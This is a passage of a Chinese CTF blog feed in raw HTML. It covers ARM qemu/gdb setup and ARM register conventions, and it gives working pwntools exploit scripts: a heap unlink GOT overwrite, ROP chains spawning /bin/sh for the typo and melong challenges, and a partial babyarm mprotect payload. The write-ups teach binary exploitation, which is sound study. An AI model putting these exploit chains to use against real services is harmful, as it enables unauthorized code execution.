gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x18</span> +p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">change(<span class="number">6</span>,pay)</span><br><span class="line">pay = p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">change(<span class="number">6</span>,pay)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">change(<span class="number">6</span>,p64(system))</span><br><span class="line">change(<span class="number">1</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br><a href="https://www.jianshu.com/p/b5ce1e4aee6a" target="_blank" rel="noopener">https://www.jianshu.com/p/b5ce1e4aee6a</a><br><a href="https://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">https://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;把ctf wiki里的unlink题简单的做了一下&lt;br&gt;先简单的记录一下，以后吃透了再回来好好的填填坑&lt;/p&gt;
&lt;p&gt;理解了一下unlink的操作&lt;br&gt;就是构造一个chunk，例如&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302000&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000051&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302010&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000040&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#fack_chunk（构造成一个free掉的样子）  0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302020&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x00000000006030d0&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x00000000006030d8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302030&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302040&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302050&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000040&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x00000000000000a0&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#p位改成0，free下一个chunk之后会与上一个chunk合并&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302060&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x654420746f626f52&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x00000000006c6976&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302070&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302080&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302090&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020a0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020b0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020c0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020d0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020e0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x13020f0&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000020f11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>arm的环境搭建+简单的例题</title>
    <link href="https://c0yo7e.github.io/2020/02/07/arm%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E9%A2%98/"/>
    <id>https://c0yo7e.github.io/2020/02/07/arm的环境搭建-简单的例题/</id>
    <published>2020-02-07T14:54:19.000Z</published>
    <updated>2020-08-02T05:10:49.346Z</updated>
    
    <content type="html"><![CDATA[<p>关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看</p><h2 id="arm环境搭建"><a href="#arm环境搭建" class="headerlink" title="arm环境搭建"></a>arm环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装qemu</span><br><span class="line">apt-get install qemu</span><br><span class="line">#更新一下</span><br><span class="line">sudo apt-get update</span><br><span class="line">#安装32位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line">#安装64位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#安装gdb调试工具</span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="32位的调试步骤："><a href="#32位的调试步骤：" class="headerlink" title="32位的调试步骤："></a>32位的调试步骤：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line"></span><br><span class="line">#32位程序下断调试步骤</span><br><span class="line">1： qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./文件(窗口1)</span><br><span class="line">2： qemu-arm-static -g 1234 ./文件（窗口1）</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><h3 id="64位的调试步骤："><a href="#64位的调试步骤：" class="headerlink" title="64位的调试步骤："></a>64位的调试步骤：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#64位程序下断调试步骤</span><br><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./文件(窗口1)</span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><h3 id="起qemu的那个虚拟机"><a href="#起qemu的那个虚拟机" class="headerlink" title="起qemu的那个虚拟机"></a>起qemu的那个虚拟机</h3><p>（上面那些命令行好像更方便一点，这个的话可能每次打题都要起一次）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic,macaddr=52:54:00:12:34:56 -net tap -nographic</span><br></pre></td></tr></table></figure><h2 id="架构下的寄存器"><a href="#架构下的寄存器" class="headerlink" title="架构下的寄存器"></a>架构下的寄存器</h2><h3 id="64位的寄存器"><a href="#64位的寄存器" class="headerlink" title="64位的寄存器"></a>64位的寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x0~x7：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在x0中。</span><br><span class="line">x8：用于保存子程序的返回地址，使用时不需要保存。</span><br><span class="line">x9~x15：临时寄存器，也叫可变寄存器，子程序使用时不需要保存。</span><br><span class="line">x16~x17：子程序内部调用寄存器（IPx），使用时不需要保存，尽量不要使用。</span><br><span class="line">x18：平台寄存器，它的使用与平台相关，尽量不要使用。</span><br><span class="line">x19~x28：临时寄存器，子程序使用时必须保存。</span><br><span class="line">x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。</span><br><span class="line">x30：链接寄存器（LR），用于保存子程序的返回地址。</span><br><span class="line">x31：堆栈指针寄存器（SP），用于指向每个函数的栈顶。</span><br></pre></td></tr></table></figure><h3 id="32位的寄存器"><a href="#32位的寄存器" class="headerlink" title="32位的寄存器"></a>32位的寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: 用于函数调用入参，32位最多支持4个入参，当多于4个入参是将通过压栈方式进行传递。栈的方式为先进后出，估参数大于4个时 入栈顺序与参数顺序正好相反，子程序返回前无需回复R0~R3的值,32位的返回结果保存在r0中。</span><br><span class="line">r4-r11: 用于保存局部变量。函数进入后首先第一件事就是将R4~R11入栈保存(看局部变量用了多少个，不一定所有都需要入栈)，然后才能用于本函数使用，本函数使用完之后，要将之前栈保存的数据恢复到R4~R11中</span><br><span class="line">r7: 系统调用时，存放系统调用号，有时也用于作为FP使用。FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯。</span><br><span class="line">r13: SP，即栈指针寄存器，主要用于指向当前程序栈顶，配合指令pop/push等。</span><br><span class="line">r14: LR，即链接寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行。</span><br><span class="line">r15: PC，即程序寄存器，主要用于存放CPU取指的地址。是取值地址，不是当前运行地址。</span><br></pre></td></tr></table></figure><p><img src="/2020/02/07/arm的环境搭建-简单的例题/1.png" alt></p><h2 id="arm的简单例题"><a href="#arm的简单例题" class="headerlink" title="arm的简单例题"></a>arm的简单例题</h2><h3 id="32位简单的arm"><a href="#32位简单的arm" class="headerlink" title="32位简单的arm"></a>32位简单的arm</h3><h4 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h4><p>就是道很简单的ret2text<br>用命令行先连上qume和gdb，让它跑起来</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/2.png" alt></p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/3.png" alt></p><p>然后就可以调了<br>我们在gdb里生成字符串，自己输的话，计算长度可能会出bug<br>调出长度之后就去找程序有没有system(‘/bin/sh’)<br>这个东西去了函数符号表，我不会那个rizzo的恢复，所以直接找字符’/bin/sh’</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/4.png" alt><br>会发现它在一个函数里<br>这个长得就很像execve，f5进去看一下</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/5.png" alt><br>然后这个名字就很像了，再加上系统调用号也出来了<br>（经大佬指点才知道arm32中系统调用号是在r7里的）<br>点开汇编，发现它确实是<br><img src="/2020/02/07/arm的环境搭建-简单的例题/6.png" alt><br>然后我们就用syscall来做这题吧<br>syscall要用的话，肯定是要r1、 r2的参数都得为null的<br>所以我们去找gadget<br><img src="/2020/02/07/arm的环境搭建-简单的例题/7.png" alt><br>r0的就只有一个，然后还有相关的r1和r7都能对应找到<br>唯独发现没有pop r2的gadget，所以我们考虑一下xor或者是mov（xor好像在arm里没有）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/8.png" alt><br>这里面对r2有赋值为零的gadget，我们可以用一波，但事实它还自带三个pop，为了堆栈平衡，我们就还得填充三个0<br>差不多就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    io = process(&quot;./typo&quot;, timeout = 2)</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    io = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])</span><br><span class="line">else:</span><br><span class="line">    io = remote(&quot;pwn2.jarvisoj.com&quot;, 9888, timeout = 2)</span><br><span class="line"></span><br><span class="line">mov_r2 = 0x0004df00 #mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">syscall = 0x0002165C</span><br><span class="line">pop_r3_r7 =0x0000a958</span><br><span class="line">pop_r0_r4 = 0x00020904 #pop &#123;r0, r4, pc&#125;</span><br><span class="line">pop_r1 = 0x00068bec</span><br><span class="line">pop_r7 = 0x00014068#0x00008160</span><br><span class="line">binsh = 0x0006c384</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*112 </span><br><span class="line">payload += p32(mov_r2)</span><br><span class="line">payload += p32(0)+p32(0)+p32(0)</span><br><span class="line">payload += p32(pop_r0_r4)</span><br><span class="line">payload += p32(binsh)+p32(0)</span><br><span class="line">payload += p32(pop_r7)+p32(0xb)</span><br><span class="line">payload += p32(pop_r1)+p32(0)</span><br><span class="line">payload += p32(syscall)</span><br><span class="line"># r0-&gt;binsh  r1,r2-&gt;0  arm的系统调用号存在r7</span><br><span class="line"># io.sendline(&apos;\n&apos;)</span><br><span class="line">io.sendlineafter(&quot;if you want to quit\n&quot;, &apos;\n&apos;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然后我碰到一个很难受的bug，本地加了context.log_level = “debug”是能跑通的，但是不加就不行了，为啥呢，害，到时候再探究探究</p><h4 id="melong（arm32位）"><a href="#melong（arm32位）" class="headerlink" title="melong（arm32位）"></a>melong（arm32位）</h4><p>这题是个 简单的栈题，我被难倒的地方是offset到底是什么<br>这题的栈溢出存在于write那个函数里的read<br>用-1绕过len，使我们可以输入很多的东西，可以构造rop链<br><img src="/2020/02/07/arm的环境搭建-简单的例题/9.png" alt><br>write函数里面长这样，我们到出去看a2是什么<br><img src="/2020/02/07/arm的环境搭建-简单的例题/10.png" alt><br><img src="/2020/02/07/arm的环境搭建-简单的例题/11.png" alt><br>发现是v4，去找他的偏移，发现是0x54，就一般在我的印象里，偏移应该是ebp+0x54，所以应该再加一个4的，但是看了很多exp都是用的0x54</p><p>发现我们需要覆盖到dd4的地方 r11（d14-&gt;exid即下一个函数的地址存放处）而开始覆盖是在d80，offset为84 即 0x54（但是我并没有在ida里找到那段代码）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/12.png" alt><br>这个是我写入100个字符之后，触发exit之后报错之后，计算出来的 偏移，就是0x54，这题也确实比较独特，ida里的偏移果然不一定是对的</p><p>然后用put的方法leak的话呢，本来以为会比较快捷方便一点，但是这里最想不到的是，进入了puts函数之后，结尾时会否存在pop，pc又在哪里赋值，在傻傻地用正常栈的方法试了一遍发现不行，选择跟进去看看puts里面的玄机</p><p>发现在末尾它有一个pop<br><img src="/2020/02/07/arm的环境搭建-简单的例题/13.png" alt><br>所以要想回到主函数还要填充些值进寄存器里</p><p>exp大概就如下了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./melong&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">    p = remote(&quot;localhost&quot;, 9999)</span><br><span class="line">elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./melong&quot;, checksec = False)</span><br><span class="line">libc = ELF(&quot;./lib/libc.so.6&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line">def check(height,weight):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;height(meters) :&quot;,str(height))</span><br><span class="line">p.sendlineafter(&quot;weight(kilograms) :&quot;,str(weight))</span><br><span class="line"></span><br><span class="line">def exercise():</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def register(num):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;3&quot;)</span><br><span class="line">p.sendlineafter(&quot;training?&quot;,str(num))</span><br><span class="line"></span><br><span class="line">def write(content):</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;4&quot;)</span><br><span class="line"># p.sendlineafter(&apos;\n&apos;,content)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def out():</span><br><span class="line">p.sendlineafter(&quot;number:&quot;,&quot;6&quot;)</span><br><span class="line"></span><br><span class="line">pop = 0x00011bbc</span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x54+p32(pop) + p32(elf.got[&apos;puts&apos;]) + p32(elf.sym[&apos;puts&apos;]) +p32(0)*7+p32(elf.sym[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">out()</span><br><span class="line">p.recvuntil(&quot;See you again :)\n&quot;)</span><br><span class="line"></span><br><span class="line">put_addr = u32(p.recvn(4))</span><br><span class="line">print hex(put_addr)</span><br><span class="line"></span><br><span class="line">libc.address = put_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">pay = &quot;a&quot;*0x54 + p32(pop) + p32(next(libc.search(&quot;/bin/sh&quot;))) + p32(libc.sym[&apos;system&apos;])</span><br><span class="line"></span><br><span class="line">write(pay)</span><br><span class="line">out()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位简单题"><a href="#64位简单题" class="headerlink" title="64位简单题"></a>64位简单题</h3><h4 id="2018-上海大学生网络安全大赛-babyarm"><a href="#2018-上海大学生网络安全大赛-babyarm" class="headerlink" title="2018 上海大学生网络安全大赛 babyarm"></a>2018 上海大学生网络安全大赛 babyarm</h4><p>开了nx<br><img src="/2020/02/07/arm的环境搭建-简单的例题/14.png" alt></p><p>一眼看到了mprotect函数，一般呢有它就是改权限然后写shellcode了，上一次用这个好像是level5，emmmm碰巧这题好像也可以用这个方法做，听说是有三个参数的函数要调用和写参的话就用csu这种方法比较简单</p><p>我们知道这个题目有两层输入，第一层是不存在溢出的，第二处才存在，所以我们在第二处用csu的方法再调用回存储第一处输入的位置<br>所以我们找一下万能gadget</p><p>我们发现mprotect的几个参数传递过程如下</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/15.png" alt></p><p>mprotect是从0x411000开始的，题目中输入的地址为0x411068，所以可以让mprotect来改权限（这题好像和oj leve5不一样的是它不需要借助bss段了</p><p><img src="/2020/02/07/arm的环境搭建-简单的例题/16.png" alt></p><p>关于gadget的传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ret     跳转到 x30 寄存器，一般在函数的末尾会恢复函数的返回地址到 x30 寄存器</span><br><span class="line"></span><br><span class="line">ldp x19, x20, [sp, #0x10]     从 sp+0x10 的位置读 0x10 字节，按顺序放入 x19, x20 寄存器</span><br><span class="line"></span><br><span class="line">ldp x29, x30, [sp], #0x40      从 sp 的位置读 0x10 字节，按顺序放入 x29, x30 寄存器，然后 sp += 0x40</span><br><span class="line"></span><br><span class="line">MOV X1, X0  寄存器X0的值传给X1</span><br><span class="line"></span><br><span class="line">blr x3      跳转到由Xm目标寄存器指定的地址处，同时将下一条指令存放到X30寄存器中</span><br></pre></td></tr></table></figure><p>所以x29和x30会在x19和x20前面布置<br>x30是存放下一个执行的地址，相当于ebp吧<br>pc相当于rdi<br>所以我们布置rop：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect_addr </span><br><span class="line">payload += 